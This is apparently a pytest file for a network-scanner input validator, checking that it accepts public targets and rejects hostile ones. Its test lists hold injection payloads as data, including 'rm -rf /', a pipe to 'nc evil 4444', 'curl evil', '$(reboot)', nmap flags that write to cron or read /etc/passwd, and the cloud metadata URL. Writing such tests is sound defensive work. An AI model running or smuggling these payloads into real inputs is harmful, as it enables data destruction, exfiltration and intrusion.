"""Security contract for the scanner input validator (Tier-0 hardening)."""

import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "tools", "security_network"))

from scan_input_validator import (  # noqa: E402
    ScanInputError,
    validate_ports,
    validate_severity,
    validate_target,
)


# ---- targets that MUST be accepted ---------------------------------------
@pytest.mark.parametrize(
    "target",
    [
        "scanme.nmap.org",
        "example.com",
        "8.8.8.8",
        "1.1.1.1/32",
        "1.1.1.0/24",
        "https://example.com",
        "http://example.com:8080/path",
        "sub.domain.example.co.uk",
    ],
)
def test_valid_public_targets_accepted(target):
    assert validate_target(target) == target.strip()


# ---- argument-injection: a leading dash must ALWAYS be rejected -----------
@pytest.mark.parametrize(
    "target",
    [
        "-oN /etc/cron.d/pwn",
        "--script=http-shellshock",
        "-iL /etc/passwd",
        "-",
        "--datadir=/tmp",
    ],
)
def test_argument_injection_rejected(target):
    with pytest.raises(ScanInputError):
        validate_target(target)


# ---- shell metacharacters / whitespace must be rejected ------------------
@pytest.mark.parametrize(
    "target",
    [
        "example.com; rm -rf /",
        "example.com && curl evil",
        "example.com | nc evil 4444",
        "$(reboot)",
        "`id`",
        "a b",
        "exam\nple.com",  # embedded control char (a trailing one is stripped and fine)
        "ex\tample.com",
    ],
)
def test_metacharacters_rejected(target):
    with pytest.raises(ScanInputError):
        validate_target(target)


# ---- SSRF / internal pivot blocked unless explicitly allowed -------------
@pytest.mark.parametrize(
    "target",
    [
        "169.254.169.254",  # cloud metadata
        "127.0.0.1",
        "10.0.0.5",
        "192.168.1.200",  # the hub
        "100.64.0.4",  # mesh hub
        "localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.1.200:3000/",
    ],
)
def test_internal_targets_blocked_by_default(target):
    with pytest.raises(ScanInputError):
        validate_target(target)


@pytest.mark.parametrize(
    "target",
    ["127.0.0.1", "192.168.1.200", "100.64.0.4", "http://192.168.1.200:3000/"],
)
def test_internal_targets_allowed_with_optin(target):
    # An explicit operator opt-in (confirm_internal) lets these through.
    assert validate_target(target, allow_internal=True) == target.strip()


# ---- ports: safe flags/lists accepted, dangerous options rejected --------
@pytest.mark.parametrize("ports", ["-F", "-p-", "-p80,443", "-p1-1000", "80,443", "--top-ports=100", "", None])
def test_valid_ports_accepted(ports):
    out = validate_ports(ports)
    assert not out.startswith("--script")


@pytest.mark.parametrize(
    "ports", ["--script=http-shellshock", "-oN /tmp/x", "-iL /etc/passwd", "80; reboot", "-p80 --script"]
)
def test_dangerous_ports_rejected(ports):
    with pytest.raises(ScanInputError):
        validate_ports(ports)


# ---- severity: only the enum ---------------------------------------------
def test_valid_severity():
    assert validate_severity("medium,high,critical") == "medium,high,critical"
    assert validate_severity("") == "medium,high,critical"


@pytest.mark.parametrize("sev", ["medium,evil", "; rm -rf", "urgent"])
def test_invalid_severity_rejected(sev):
    with pytest.raises(ScanInputError):
        validate_severity(sev)
